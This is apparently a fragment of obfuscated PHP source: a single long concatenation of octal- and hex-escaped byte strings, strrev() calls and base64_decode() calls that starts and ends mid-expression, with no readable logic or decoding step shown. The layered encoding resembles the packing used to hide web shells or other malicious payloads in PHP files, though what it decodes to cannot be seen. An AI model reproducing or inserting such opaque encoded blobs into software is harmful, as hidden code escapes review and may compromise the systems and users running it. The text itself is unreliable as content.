375\307\367\133\63\152\350\360\366\133\165\170\150\153\321\157\15\276\62\201\176\231\345\67\261\11\76\266\67\330\335\32\164\137\101\222\203\340"."\251\141\6\305\20\152\306\2\14\241\5\236\36\130\230\134\370\156\256\236\262\25\253\141\376\245\106\111\215\151\13\306\132\243\241\226\40\30\345\363\211\232\116\130\42\260\141\100"."\320\130\164\51\377\346\227\1\313\74\153\50\65\14\231\153\25\107\107\124\137\312\310\26\163\171\322\130\245\12\133\155\124\171\360\266\101\356\103\51\125\170\333\103\0\55\205\226"."\136\15\276\216\117\214\171\253\127\124\173\352\75\15\265\12\270\335\240\71\300\331\206\122\5\26\342\74\237\243\22\117\322\21\152\360\324\327\52\125\205\221\52\150\227\30\127\324".strrev('êJg6î)†áJÎƒ‘>R4~Ïpò’–ÛÏUM²ÑäE¤W7,§ª)iMú')."\167\243\247\232\130\113\246\174\66\277\327\317\246\271\272\126\111\302\125\207\12\221\44\233\143\60\232\35\203\121\123\7\164\242\247\203\317\67\275\307\240\320\153\156\264\131\252\305"."\46\12\240\144\252\60\224\316\26\113\153\240\156\240\311\241\351\321\7\217\301\26\377\274\44\104\216\170\4\233\101\14\347\223\130\41\216\70\104\251\242\154\33\355\147\316\32\142".base64_decode('pA4ccXSt4H1guKww/oG7U8EX9oLx1k6K5TEJzdPJ6Q5EFcOpOFCE8/6Qji4XTBD2')."\x24\xe9\x42\xdd\xed\x91\x68\x17\xbd\xa8\x16\x6b\xed\xc\x76\x5\x7c\x40\xc4\x29\x26\xd0\xf4\x98\x39\x52\x9a\x95\x6a\x4c\xf9\x28\xa8\xda\x31\xfc\xa4\x22\x36\x64\x71\x52\x2b\x5a\x57\x9\x1b\x71"."\x3a\x74\x14\xa\x43\xd0\x18\x98\x7d\x85\xdc\x91\x56\x49\x96\xe6\x6a\xea\xc2\x0\x8a\xe4\x7e\x7f\x22\xd1\x78\x2\xd\x0\x90\x67\x89\xea\x56\x4b\xbb\x85\x64\xe8\x8d\xef\x5b\x8d\x31\xa6\x7d\x10"."\61\71\6\363\334\220\116\62\367\100\250\160\134\146\153\244\273\75\304\356\344\265\201\110\134\140\12\23\110\324\26\15\341\73\362\120\277\302\212\222\156\102\242\200\260\230\100\201"."\xc2\x78\x9a\x7f\x8b\x8b\xdf\x38\x82\xef\xf9\x28\x20\xb6\x7c\x14\xe0\x9b\xd\x4e\x25\xf9\x31\xc2\xf5\xc7\xba\xf9\xb7\xe0\x4e\x51\x0\x5b\xd\xa\xea\xbb\xac\x8d\x7f\x77\xf2\x7b\xbe\x38\x22\x12"."\x95\x2\x81\x68\xa0\x2b\xc6\x83\xd1\x65\xfc\x86\x7\x87\xd1\x9b\x1e\x89\xee\xde\x2e\x41\xf1\xc3\x81\xa5\x8\x59\x22\x82\x41\x61\xd4\xba\xc6\x37\x63\x71\x6d\x3f\xbd\x36\x47\x3f\xe9\xcf\xd1\x2c".base64_decode('hK8SDaxq8Chz1tRCGnbRLGFn9DxjJHEtx4YT4UgHDRP/SsF8WggQSp+CuNq44Got')."\266\165\361\325\240\40\34\126\350\25\141\245\73\262\54\40\134\366\110\21\0\21\36\174\374\307\367\365\217\367\373\20\263\140\255\24\327\340\332\132\24\306\206\264\22\1\234\312"."\xe9\x90\x3b\xc0\xb6\xd1\x95\x1e\xd8\x31\x12\x59\x63\x88\xb9\xdf\x40\x4\x91\xb1\xb\xf4\x77\x39\xfb\x20\xb4\x12\x32\x20\xa9\xb4\x90\x65\xf7\xe1\xe8\x45\xbc\x44\xff\xea\xfe\x9f\xf4\x7b\x7d\xf4"."\xee\x21\x66\x5e\xfa\x3d\xa2\x49\x89\xe0\x72\xb4\xc7\xc6\x62\x8e\x8b\x93\x9\xe2\x95\x6\x4a\x47\xbd\x84\x2f\xba\x6a\x69\x60\x21\xfc\x80\xb8\xb4\x10\xd8\x53\x8\x2e\x6a\xe6\x93\x19\x3c\x76\x75".base64_decode('N/rXEV8dRP/C6CccR9Ol8wRoSYZDS4Kr8X8iopYPJL1o5MwQ6l6N/kcEZnWo211Y')."\113\60\276\54\30\244\11\330\67\374\212\244\210\340\100\127\45\377\133\330\222\37\242\205\145\77\24\235\110\324\220\301\364\16\324\325\46\22\176\253\27\360\205\173\104\250\251\236"."\326\120\15\173\110\40\326\52\250\257\3\41\312\161\201\330\335\73\21\201\173\225\202\160\107\64\322\333\43\205\73\3\113\103\335\35\54\344\237\301\276\146\100\321\112\133\50\206"."\x86\xa8\x95\x21\xa3\x70\x76\x25\x87\x81\xe1\x24\x6c\x91\xcc\xf5\x3a\x50\xba\xd\x51\x76\x14\x90\x58\x76\x2c\xc\x50\xca\xec\x5c\x65\x2d\xbd\xa1\x70\x9b\x7c\x57\x1c\x27\x84\xd\x85\x50\x75\xd8"."\123\246\263\306\261\60\271\65\316\2\170\310\331\67\101\67\26\40\143\300\2\164\0\130\210\14\27\13\20\247\132\54\100\72\312\2\130\72\11\166\263\70\44\0\42\341\215\111"."\165\31\165\214\137\166\134\220\116\112\376\22\60\15\366\121\325\26\166\232\201\44\106\225\53\40\135\332\113\242\110\222\144\165\152\135\247\110\167\256\375\24\204\270\115\2\104\277"."\xfd\x2b\x17\x13\x6e\x78\x25\x43\x4c\x7a\xb1\xd7\x8e\xeb\x76\xd6\x51\xb\x5c\x3\x44\xb5\x84\xc8\xad\x4b\xa9\x1e\x76\x2e\x48\xd4\x76\x9\x43\x52\x1d\x93\x8d\x5a\x6\x8\x45\x11\xd5\x33\x83\x4e"."\126\350\133\260\125\41\321\326\322\240\123\204\342\164\151\45\227\214\300\207\203\7\176\241\105\373\322\237\176\10\62\75\3\334\147\251\366\300\46\313\356\100\70\75\35\364\367\127"."\x4d\x35\x5a\x90\x80\x8d\x19\x4\xab\x68\x90\xe5\xd2\xf9\x9e\x97\xca\x60\xbf\x1b\x9\x3b\xc7\xf4\xd4\x44\x38\x13\x1a\x61\xaa\x55\x16\xe1\xb6\x68\xa4\x87\x72\x20\x4a\xa8\x5d\xa1\x5e\x1d\x94\x6a"."\xaa\x87\xae\x6\xd6\xaa\x35\x1a\xc4\xab\x83\xa6\x62\x71\x35\xd5\xe\xd\xd2\xa2\x6a\x5\xee\x52\xd7\x3a\x73\x85\xba\xdb\x82\xcb\x95\x6a\x3d\x3d\x91\x50\xd5\x4\x64\x56\xd0\x5a\x64\x5\x29\x65"."\45\261\22\150\133\341\240\312\312\30\343\212\214\136\114\136\156\245\260\270\100\271\62\326\214\70\102\140\367\126\75\40\224\363\30\312\21\323\250\120\14\155\330\341\60\351\51\212"."\322\55\314\310\172\24\356\257\0\3\261\360\101\65\223\120\20\213\240\5\321\250\340\362\170\64\200\201\204\373\334\153\117\364\207\20\24\54\35\231\71\225\136\351\44\74\233\157"."\45\50\11\126\72\130\104\312\74\142\46\21\60\210\154\171\122\237\170\14\321\24\320\141\226\365\10\113\200\353\246\241\236\150\250\53\20\135\1\103\46\144\0\130\201\106\326\161".strrev('Ìaë»'."\r".'J%3ïÁ1êg€­E…g’,)Ìs§2_-ZŞTºW«tW¥').strrev('–°a¾+‚K)PÀ†Xo@öûQ™\'‰&ñNµß+ŠÌ>àÌHxrD9PÔÄ©¹w')."\126\132\43\54\216\251\143\370\152\203\376\324\314\206\376\121\167\22\65\215\110\46\55\346\55\175\50\317\135\304\101\253\140\157\355\215\107\22\150\377\210\6\61\65\207\36\361\141".base64_decode('ldoryd3ypEAxOAH3ePkNXWNpKnWN5+eap2B3R6g72NxVCsUCXQprOOjWsGO4eVBO').base64_decode('KJIII544IavPQhHQy/qSsi+RhHBJ4lOFpbVtFiXHhLpBLJ67+FUIYoaNECIgXBFw')."\335\61\211\53\46\161\156\171\273\202\374\56\347\176\272\321\204\143\160\142\312\245\54\20\311\23\216\312\335\46\317\62\130\130\137\363\3\16\146\364\215\310\132\316\221\241\127\162".strrev('ØZÛNÈ*\\#;O±"Wóñešr·DĞ˜\\=^À›3¢vÎò^NLÕ…kC%¦ %').base64_decode('FvN2TGOWEm1JYrcubqKJOzySPTs5zBDzQt1dujJCSSHecSmVAIaFV0V8jiDKHGCy')."\274\350\344\244\136\160\37\34\344\215\36\315\314\351\344\200\144\231\270\54\303\343\245\334\344\326\223\361\115\203\133\314\243\32\172\370\314\172\33\130\142\346\46\227\340\221\302\5"."\131\176\3\4\115\51\311\53\135\21\40\314\24\24\153\302\121\345\221\256\306\331\206\321\245\346\113\161\143\251\256\1\366\266\105\226\165\207\43\314\31\34\363\44\111\103\103\140"."\271\200\70\27\323\307\2\66\373\60\331\15\250\145\214\275\307\134\207\344\135\370\110\31\7\310\144\12\234\14\104\133\73\221\250\236\150\17\241\275\6\155\144\242\200\116\224\325".strrev('	É^¦{}`=HÏBøĞû/†Ÿ^@Š…`/•ˆä_ÆÃ(Ff.ĞI4ÒK0')."\347\24\153\263\142\276\126\110\310\53\64\211\336\345\333\53\214\152\142\373\104\331\310\335\252\157\315\44\150\25\251\211\144\222\350\233\53\17\101\40\172\63\4\346\72\3\321\302".base64_decode('cxAiqt2RRCei2xG2u+tW3EEnWS5YrTZiPlJ+cpsVZKcF5GScns+BPLYKkUD+xSwS')."\xc0\xaf\x95\xd8\x55\x3\xf4\x67\x45\x2e\xed\x45\xd\x7\xfb\x86\xb4\x66\x73\x7f\x42\x78\x95\xb1\x8b\x7d\xb8\xcd\xd2\x5d\xe0\x1c\x27\x50\xe3\x92\x5f\x41\x75\x4c\xc3\x57\xa9\x98\x66\xa2\xcc\x30"."\x4\xba\x52\xde\x39\xee\x40\xca\x79\x20\x8f\x4f\x94\x62\x91\xde\x28\x3b\xf6\xc0\x61\x72\x49\x34\x1a\x6c\x5d\xc1\x4f\x20\x38\xb4\x3d\xb0\xd4\xd\xc1\x6b\x20\x1e\xe8\xa8\x8\xe6\x4a\x24\xc\x27"."\322\132\42\32\301\332\266\140\270\335\225\41\326\311\335\102\72\141\211\160\250\173\111\305\10\264\347\167\111\131\50\60\24\17\166\271\141\316\22\142\101\274\176\105\270\45\34\151"."\225\242\103\221\362\221\340\114\5\7\122\135\35\5\372\217\257\351\137\105\304\215\46\44\165\244\127\143\241\336\233\30\250\253\135\334\277\246\266\246\337\277\330\67\203\353\242\50"."\75\221\256\223\116\1\266\30\335\157\162\3\360\226\301\200\64\33\204\374\76\37\124\302\77\374\375\176\356\304\212\221\121\360\325\33\243\356\176\34\255\160\171\303\140\327\314\175".base64_decode('bjeUIXo0mYitiPHRpqhYKd6BXzSZfLzvSoz+9chJsUVJxYQOBHVcypVBPt0Qa0Es').base64_decode('2rSRKmKPQmLExTaDQD5HEYhcjwhpGNZcjK3NPNp2YEdsRcxdR2fomCXhru5Iz7HR')."\x58\xbc\x77\xe9\xb2\xe5\x2b\x8e\x83\xd1\x65\x28\x30\xa8\x78\x99\x43\x30\x70\x70\xe9\x1f\x53\x4d\xff\x18\x73\xcc\xbc\x14\xf3\xe6\x9a\xe5\x97\x79\x1e\xe\x44\x7d\x44\xe4\x8e\x11\x2b\x3f\x15\xd9"."\171\54\246\15\376\312\121\264\64\177\56\157\67\114\221\242\307\324\222\206\141\117\21\273\264\353\233\13\206\310\276\176\153\200\341\234\77\255\215\371\5\267\302\110\30\227\110\140"."\xbf\xf6\xca\xe\xa2\x31\x7a\xca\x8c\x57\x3a\xe9\xda\x7c\x1\x20\x3c\x15\x4a\x5b\xb4\x0\x36\x32\xdb\xb9\x15\xde\x9c\x37\xdd\x1f\xef\xc0\x5e\x2c\xfb\x8f\xe3\x73\xad\x9b\x92\x1b\xc9\x94\x91\x4f".base64_decode('65JfAJUZCyeLqRF+CR9Tf8s7rjNsmsbFNDAhSqgpKrZK5nOjXiy1eNXskIH4LWYv')."\75\352\145\326\320\20\57\34\224\26\214\254\316\134\270\215\172\121\25\122\34\115\214\12\147\173\50\66\51\340\316\135\161\300\342\41\171\211\221\135\206\133\272\340\275\254\323\265".strrev('%9nÇüG_2³Z™İG Ó\\Dë1/®CÌ’Ë¥|b;s?À³)4N‘»9¢')."\x3b\xd\x60\xc4\x38\x37\x22\x6c\xaa\x72\x23\xdc\x6a\x22\xe5\x60\x4e\x30\x1f\xd0\x2e\x99\x5e\x9\xfe\x3\x9c\xac\xa3\xb8\x96\x12\xb3\x5f\x82\xb\x97\x2d\xa5\xa8\xf4\x46\x84\xc3\x7b\x83\xec\x96"."\76\260\54\66\313\333\331\25\150\365\242\55\245\161\366\34\276\261\367\307\321\316\316\20\113\35\267\146\61\171\203\102\352\346\50\31\64\23\200\61\345\216\136\247\71\235\36\123".base64_decode('IPVcmjK1NLYmYZwkhbowiQIFnaBh6nqO2VtlVN5g3A2gVRXqXV6x3uWV6l3uqnd5')."\x79\xbd\x14\xe4\xc2\x58\xb5\x50\x68\xcd\x60\x5c\x70\x50\x53\x7\x28\x25\x7\xd8\x4e\x36\x88\x6d\x67\x64\x9b\x1b\xd0\x80\x52\x43\x5a\x1f\x8a\x6e\xa3\x4c\x75\x9a\xa7\xb7\xc4\x17\x5f\x15\x83\xd2"."\172\161\24\347\3\222\237\146\33\247\305\210\130\126\265\354\245\16\77\102\337\352\156\30\173\300\350\342\142\20\347\135\375\206\145\371\261\327\103\302\261\163\213\261\110\214\235\361"."\70\373\104\137\66\221\204\161\160\277\306\175\345\162\117\272\302\335\56\125\315\323\357\40\167\3\203\4\217\300\20\166\354\201\350\34\214\112\160\242\140\130\232\354\307\71\255\21".base64_decode('L5z8JrvkFDmnTmBKxAzpJPfIzNmw7AIRD5g353DnPuFFXXc5GLY0bYQJmJIQwpUC')."\75\334\161\260\273\73\230\24\10\242\150\162\247\321\364\124\327\133\21\340\225\174\103\120\152\40\71\36\107\355\142\227\73\120\63\141\375\146\310\330\60\105\2\375\71\256\122\257".base64_decode('vabw5Izmkj4XsEQrMS/JrhXgcqzc39Hf1R+Xh8k21cFB1GzJKaqjLcKPM6Af8fDP')."\6\143\152\57\320\160\170\361\223\212\116\244\41\222\110\35\176\223\230\343\173\306\23\34\163\311\123\41\25\160\367\130\14\7\354\35\24\26\250\205\242\364\132\215\214\57\170\33"."\xe7\xce\x77\xb0\x52\x81\xfa\xde\x66\x24\x83\xf8\xc4\x6\x9f\xfb\xcd\xac\x47\x68\xe8\xf2\x2d\x46\x1a\xf6\xc4\x55\x55\x8\x13\xab\x9a\xaa\xa6\xd5\xa0\xdf\xda\x2a\x4f\x15\x66\x4e\x49\x18\xcf\x22"."\x6\x90\x76\x54\x35\x4d\xab\x21\x1f\xb5\xe0\xa2\x65\x12\x6e\x63\x48\xfe\x5f\xc5\x89\x39\xa8\x13\x16\xa3\xa1\x95\x8e\x79\x16\x93\xd1\xc0\x6b\xbf\xd1\xdf\xe8\x1f\x7\x7a\xb0\x78\x14\xd7\x28\x1e".base64_decode('znDvARMJRPbY8UVCJr5A1mHU5ZhO3hJGlrvaZjMqGug6ziscRS9cPJHLKiBpNlc3')."\xf8\xea\xab\x15\xf6\xb0\x4a\x73\x75\x6f\xbc\xdd\x3b\xaf\x7a\xf1\xa2\xbd\x16\xb6\x92\x43\x5f\x5b\xeb\xc2\xa7\xb6\xd8\x9\x37\x55\x0\x2c\x82\x43\x99\x85\x78\x79\xf1\x80\xdf\x19\x9a\x2a\x2f\xe0"."\x5f\x4e\x9d\x34\xf2\x68\xab\x43\x14\x2a\xe7\x4b\xc1\x60\xf6\x72\x2a\x26\x7c\x77\xe7\x35\x7b\xdc\x30\xe1\x44\x1b\x8\x6c\x63\xfd\x2c\x19\xa7\x1\x45\xd8\xd5\x14\xea\xd7\xa5\x9\xeb\x31\x59\xf7"."\173\13\245\142\336\213\325\20\336\230\354\263\317\365\132\100\275\63\75\126\44\70\323\313\244\61\45\310\107\116\174\322\227\37\232\24\371\71\20\311\5\261\27\363\4\164\125\62"."\x9d\x16\xc0\x30\xd5\x64\x20\x5d\x76\xe8\xcc\xf0\x1a\x93\xc4\x84\x93\x24\x1e\xed\x6a\x2f\x1e\x6a\x2f\x62\xba\x30\xfe\xa3\x45\x85\xb6\x5f\x5b\xab\x94\xc4\xf9\xe6\x84\xfb\x25\xa\xf7\x28\x90\x2c"."\x78\x72\xbd\xf2\x13\x17\x13\x88\xe3\xc6\xd1\xd8\xd9\xbd\x17\xcf\xaf\x57\x4f\x4f\x15\x23\x16\x75\xc5\xa6\xa6\x0\x55\x2a\x25\xe9\x2d\xea\x69\x77\x95\xc4\x88\xc0\x5b\x2c\xb2\xa\x2b\x16\x2a\xcb"."\x3\x2c\x1\xe9\x44\x88\x97\xe7\xe0\xcc\x55\x34\xd7\x9c\x19\x77\x33\xf7\x92\xde\xb8\xdc\x81\x3c\x5a\xbc\x4a\xe3\xcc\xa6\xd9\xf3\xd1\x5f\x20\x8f\xcc\x6\xa2\x58\x60\x46\xcb\xe8\x93\x39\x98\x3f".base64_decode('0j/I6IB4hIL1DU+45JHfARbDyFc4IyCOdKK1judNoKNUZpdeDiAKbrqSsGVQgr+0')."\120\201\222\42\141\214\155\30\260\355\112\356\336\371\204\14\261\17\223\247\127\305\22\111\146\107\104\117\222\330\76\33\60\174\4\65\324\20\154\26\331\162\45\155\162\52\123\314"."\x8f\x34\x4b\x91\x8a\x6d\x18\x4a\x4e\xcd\x97\x40\x1a\x98\x6e\x35\x4d\xb7\x16\xe0\x8a\x9a\xa7\xfb\x66\xd\x5a\x28\x0\xf4\x9a\xbb\xb1\xc5\xfb\x88\x70\x3a\x48\x9d\xe0\x40\xc\x55\xe7\xfb\xf0\xb3".base64_decode('KD68SUWLDif6Md5kqtwDBiNb5M9bFMg3tL4n3NsR6paMmyRAorWtOxHo6akYIdfh')."\307\226\1\76\166\13\27\277\217\5\324\125\317\15\51\51\174\241\241\271\12\103\253\24\313\114\61\107\277\125\176\240\261\44\201\220\255\26\352\220\245\32\147\121\6\21\12\171"."\311\27\215\256\136\264\320\257\57\342\23\41\334\21\231\206\270\257\341\363\37\205\45\55\77\66\37\312\377\4\317\274\154\315\100\240\355\302\371\220\242\54\124\25\72\306\315\325"."\xd8\xb6\x63\xb0\x5a\xc9\xa0\xbd\x9a\xdb\x4e\x2e\x72\x67\xee\x66\x47\x4a\xb\xfd\xaa\x1c\x89\x57\x5d\xd4\x60\xac\x31\x17\xb0\xc6\xb8\x12\xbf\xe2\xe9\x44\x40\x72\x8\x4e\x9e\xab\x68\x55\xf3\x4b"."\xcb\xb3\xe0\xc2\x7d\x29\x39\x8a\xce\x24\xb9\x51\x52\x9e\xde\x4f\xb4\x4\x7e\x21\x4b\x3a\x8f\x6b\xf8\x9\x47\x5\xa4\xf0\x89\x87\xa5\xd4\xd4\x8\xc6\x36\xb1\x35\x40\x9d\x10\xd1\x83\xc5\x17\x1a".base64_decode('4XjowJbMN4r4dhVRwpvikZhVq2hBmBtYs6YcBhag7qhAQXeDMOa4YVgcFzC0xzmr').base64_decode('oVgrJxIQlob+ijzh7g4RoOKKI7KPGVuTUH9ftW/GmjV+ndlJMZsOltfHU9Nwv8+Z').base64_decode('HvUEhp4nBIA7JeUtj4HFt5d/hrgRxu2hFGwk1dy8qI+f+QywOMYg6g3z2PRPZrzx')."\145\374\263\265\133\260\300\34\311\51\75\361\21\125\112\300\351\22\170\361\30\177\376\104\246\100\364\73\120\50\310\101\366\246\17\71\177\310\352\111\77\137\355\364\114\302\227\22"."\27\251\130\22\102\153\134\160\154\314\344\212\300\357\203\20\360\30\42\224\210\43\33\166\303\121\131\34\310\77\26\132\51\123\57\330\16\72\105\137\74\254\42\317\323\14\253\143".base64_decode('Kk1SpYDs3lxF/OBXIbpEY4AgiKYsxARIMbVscxVprpXRNJSfkJhKlaCMVQqjjjmV')."\217\230\151\33\150\123\344\127\172\340\261\250\336\50\134\223\10\164\303\231\17\260\133\107\35\117\177\247\35\305\20\205\274\134\226\325\114\152\13\116\250\16\71\5\34\24\372\56"."\x78\xbb\xaa\x27\x1a\x89\x47\x5a\xd9\x53\x3f\x95\x14\x63\xb3\x18\x6f\x6b\xd1\x3b\x68\x42\x6\x62\x37\x7a\xb8\xc9\x4\x4b\xc1\xb9\x5\x3f\x40\x60\xfa\xcd\x62\x3e\xcf\xad\xcf\x30\xfb\xc8\xb7\x34"."\x6c\xcd\x92\x38\x26\x16\xe9\x66\x6f\x90\xc4\x39\xf6\xe0\x97\x5c\x7c\x4a\x9f\xca\xe\xa9\xc0\x6c\x95\x9e\xba\xc5\x32\x45\x5b\x6c\x9f\xd8\xb1\x7e\x1c\x5f\xc0\xb5\x0\x2c\x39\x13\xc4\xae\xc\x51"."\101\175\124\217\331\134\317\56\156\60\243\66\161\155\13\122\126\50\203\352\210\343\334\150\114\313\73\324\43\264\356\254\301\374\53\66\326\327\327\173\353\33\320\137\176\132\14\354"."\134\23\273\106\57\45\251\257\157\42\177\151\4\321\360\302\244\70\143\20\15\140\304\13\22\214\153\32\64\10\166\206\234\236\57\62\216\253\257\25\137\316\122\160\323\6\30\223".strrev('€´x%ƒ~^Ğ(2mšŒFû6oÙa˜^cğ ÷4„$iÈP.\'$dtd=¸ƒæÚÁ')."\x5e\x98\x6c\xe6\x8d\xa\xe6\xd3\x7d\x72\x65\x3e\x36\xb8\x14\x28\x7c\x3d\x7b\x59\x84\x57\x7e\x95\x1\x32\xd1\x1d\x42\x9c\x71\x38\x9a\x86\xf2\x38\xfd\x29\x62\x8\xda\xa9\x53\xbc\x9f\x18\x20\xa9"."\123\60\27\47\371\210\304\101\371\50\203\104\363\13\163\44\224\345\67\362\161\260\233\227\104\37\377\240\217\24\301\30\126\100\327\214\61\236\20\233\61\16\36\303\103\144\110\261".strrev('ê²Z„å'."\0".'Ú-	G”\''."\0".'¹£ËeHMÍ\\uˆú’ä6'."\0".'¤f;C2ÈÊãÄj]-0ĞÅ<')."\x15\x58\x5d\xc0\x28\xe0\xbd\x82\xbc\x9b\x47\x8d\x45\x9b\xf6\x2a\x9b\x3f\xdb\x3d\x77\x64\x1a\x4c\x43\x5c\xac\x2d\xb3\xf7\x61\x21\x69\x32\x98\xc6\x3c\xf6\x2d\x26\x39\xc\x12\x64\x0\x6a\xc4\xd2"."\xca\x3d\x28\x4a\x5\xb8\xa3\x5c\x79\x2\x54\xd1\x5e\x96\x1\xe0\xe5\xa9\xc9\xe1\x44\x85\xd4\x18\xee\x4a\x4d\x7c\x27\xb6\x72\x7\xb0\xb2\x43\x45\x6a\x3d\x20\xd9\x98\x58\xe0\xe4\x5e\x98\xb\xb0"."\x32\xc6\x24\x69\xca\x57\x30\x8d\x21\x34\xcd\x96\x3c\x68\x8\xde\x53\x19\xcc\x93\x97\xa7\xac\x90\x88\xb7\x5e\x4e\x27\x3\xf1\xc9\x7\x7b\xbd\x12\x30\x56\x5c\xee\x55\xc5\xe3\xb9\x52\x52\x21\xdc"."\110\100\347\202\225\42\132\371\143\104\62\20\113\147\262\201\10\61\301\165\226\201\305\76\47\204\267\354\33\220\216\211\353\66\274\164\52\33\40\322\144\202\350\140\125\212\254\360"."\x4d\x38\xd0\x84\xe1\x2a\xb3\x47\xc1\x23\x24\xce\x86\x9d\x70\xa\xa3\x2\xb5\xe3\x38\x29\x4e\x68\x59\x56\x63\xf\xaf\x2\xb5\x23\x8b\xa\x17\x40\xec\x76\x5c\x83\x2a\x16\x2\x2c\xdd\xe6\x66\x39"."\x9b\x33\xee\xed\x9f\x9f\xc3\x3e\x36\xb2\x54\x78\x58\xb9\x3e\x50\x56\x94\xe3\x21\x4d\xc8\xba\xe\xbc\xa2\x3b\xf9\x7b\x9f\x15\x10\xd1\x89\x6c\x65\x58\x45\x58\x0\x5c\x40\x13\xa7\x76\x52\x8\x9"."\163\214\337\113\263\366\216\26\65\306\243\112\244\121\261\5\141\4\62\26\317\230\206\315\345\27\34\37\110\113\344\76\54\163\50\161\232\305\273\110\324\343\70\127\223\374\70\363"."\244\150\53\143\265\253\154\173\43\106\142\304\17\266\44\122\271\202\156\103\62\262\25\331\154\67\141\216\261\363\374\171\53\74\235\61\311\216\247\102\15\220\211\147\201\75\322\324".base64_decode('UoZJZGvJE0HejmpDcjBscJ0CPsfRKhSBnb9IaI+xAEm7RdmVjOQ/G4UkR+kSr+Nt')."\120\70\223\224\240\45\323\100\235\24\101\322\127\342\227\134\132\57\351\106\3\21\346\143\305\44\77\174\160\161\61\354\222\204\42\63\11\354\326\3\56\200\170\365\300\75\260\344".strrev('J"	#£÷ÑJ$UB¦)VÓeï@{ä1¾Ÿxq¡e–u!g&z+qö,T8')."\263\25\364\66\64\172\231\307\43\371\6\5\143\224\201\216\241\265\40\241\1\226\51\30\155\4\303\77\110\47\322\30\322\21\16\361\227\41\374\11\20\327\40\174\76\211\17\21"."\x1e\x32\xa5\xbd\x4c\xe3\x46\x81\xc4\x99\x86\x4c\x56\xc4\x49\x3b\xb5\x15\xc4\x9\x7a\x2b\xc5\xd3\x11\xc2\xd1\x6d\xe\x53\x4a\x57\x2\xb4\x32\x9c\xf1\xe0\x14\x5d\x34\x86\xfa\xf3\x30\x1c\xf6\x38".base64_decode('rkLA4b7s7J3kEv0QVqkIZFDX69LACIsB6maEmdNyuiTAcYMDy60OfNycGO6WwluV').base64_decode('NbX4bqlDg9NV4jcAsU0Q3iS4TaclB1gsR07LEaA2UI7cHMRTjWvsmijTNPR09vg5').base64_decode('qIUvTyqdCu9GrczQSLz7Pp7TU0o40hFqDYTbQrElypBmK8I8gjyY4FzKRLFGB55h')."\165\222\373\356\307\237\336\44\342\130\275\151\316\270\133\202\105\227\54\301\244\107\222\234\305\122\374\323\314\262\22\363\370\366\107\266\54\17\126\27\126\110\235\25\332\63\51\161".base64_decode('wdTK05c08nC7aLGUoVihNZC+cg3kgQU5NdqItfxUjdfzY7qli4XPcpTk0gNtXaHu')."\104\40\34\106\342\275\154\61\47\24\245\46\177\316\42\55\277\176\41\315\214\230\4\132\173\271\323\55\160\131\44\73\41\167\111\352\164\372\144\347\153\5\166\44\0\17\375\161"."\x67\xf8\x34\x28\x3d\x65\x53\x30\x55\xdd\xd2\x24\x0\x7d\x61\x65\x6\x5c\xb6\x50\xb3\x59\xc7\x23\x76\xd9\x41\x29\x58\x74\xee\xac\x15\xab\x4a\xd0\xa\x18\x4c\xf2\xef\x56\x29\x41\x14\x3f\x97\xfe"."\xbf\x6e\xaa\x9e\x16\x7e\x96\xf4\x34\xb3\x4c\xe0\x77\xe3\xa8\x9f\xfc\x56\xf9\xa9\x43\x56\x67\xd9\x73\x3d\xdf\xfa\xf0\x8f\x47\x1c\xa2\x24\x88\xcf\x1a\xf6\xfe\x98\x41\xd8\x71\xe0\x15\x29\x2c\x14"."\x49\xd0\xa7\x7a\x45\x15\x48\x50\x34\x4b\x5\xf9\x14\xcb\x9f\xf6\xf3\x21\xa6\x1f\xd8\x9d\x5c\x90\xa9\xac\x71\x40\x30\xc6\x38\x39\x94\x86\xab\xa3\xe2\x12\x92\x2\xb1\x5e\x87\xb1\xd0\xcc\x2\x12"."\321\11\30\147\307\51\256\353\11\43\267\201\250\343\21\363\262\72\210\267\174\32\327\207\273\203\122\16\210\316\241\20\177\373\102\144\165\307\124\150\0\212\126\204\332\204\47\120"."\232\225\172\372\232\26\177\315\100\131\310\156\372\212\12\210\3\250\140\256\140\73\104\311\116\331\62\134\232\33\12\40\234\216\20\25\260\175\215\221\53\225\1\34\272\222\60\153"."\27\67\310\303\157\71\344\7\15\171\374\10\101\306\146\376\364\115\74\52\263\172\20\257\257\331\345\117\342\320\354\377\137\62\322\310\230\144\246\350\54\244\274\101\226\173\253\23"."\154\27\176\355\47\143\214\73\37\306\303\20\367\373\76\216\227\175\244\105\103\56\244\312\157\21\71\63\171\312\336\324\120\310\133\247\12\102\165\230\105\354\305\210\311\104\44\261"."\124\365\164\372\323\17\277\154\73\163\67\202\22\52\250\262\226\43\125\153\106\317\246\115\156\60\42\0\135\232\20\124\111\56\154\63\241\262\67\135\311\63\141\155\214\46\303\63"."\36\225\136\200\302\316\334\234\357\222\210\347\136\304\336\351\174\20\203\37\173\132\142\61\130\266\343\301\225\270\21\127\207\74\224\43\303\124\115\204\132\112\362\267\154\44\112\172"."\x81\x22\x99\x32\x29\xcd\xe7\x7b\x91\x94\x80\xbd\xb3\x96\xf6\x90\x47\xc0\x28\xa9\x73\xbf\x13\x22\xad\x34\x4e\x3f\xe5\xdc\x43\x59\x23\xa9\x66\xa3\xd4\xce\xca\x71\x29\xc4\x44\xd2\x14\xb7\x9d\x74"."\44\243\40\277\132\50\210\243\27\171\313\104\377\73\56\316\101\134\157\274\63\101\256\177\47\350\131\155\114\340\234\164\150\103\201\160\200\123\314\207\250\242\333\1\65\45\71\117".strrev('ÊƒY>½G	`lŠ(‚Ø‹çåı¿·¥Û]k¼ì‘r`0Sg¡ìíG$†âUG¥ğ6')."\102\105\240\206\143\41\143\124\102\334\260\207\174\20\112\41\63\356\337\0\345\30\354\174\203\206\242\72\371\151\323\6\271\24\203\303\142\67\227\175\126\10\233\3\367\63\152\254".base64_decode('Gv4KnIf2TLz+Sd988/D33TzUZ6AHXnXziJt23/SMjXjS1/kOMG4zt0gsEyfckgQf').base64_decode('KleGqHvg4ka5zlGcquaLOXFOjQJOyaqsw1IPi2bWQ86UPcyTm2s4RK/kmakwht9e')."\x6\x35\x4c\x25\xe2\x52\xda\x49\xaf\x9a\x16\x26\x4d\x76\x2e\xe7\x4e\xa6\x3b\xb0\x2e\x61\x6a\xe2\xc6\x9\xf5\x60\x59\x46\xda\x57\xe4\xd2\x8d\x33\x67\xcf\x97\xd5\x12\x62\x7e\xc4\xe9\x15\x5c\x79".base64_decode('h9M24DPEjCtOfFKY20x53ZJIp81w+fOLLtr9v8N8wffTpJIFb/kztmUjQJBQsm2R').strrev('HÈx’V'."\n".')ÕMµõ¬9ÇKFx›è±,vı'."\n".'ş7EÖt]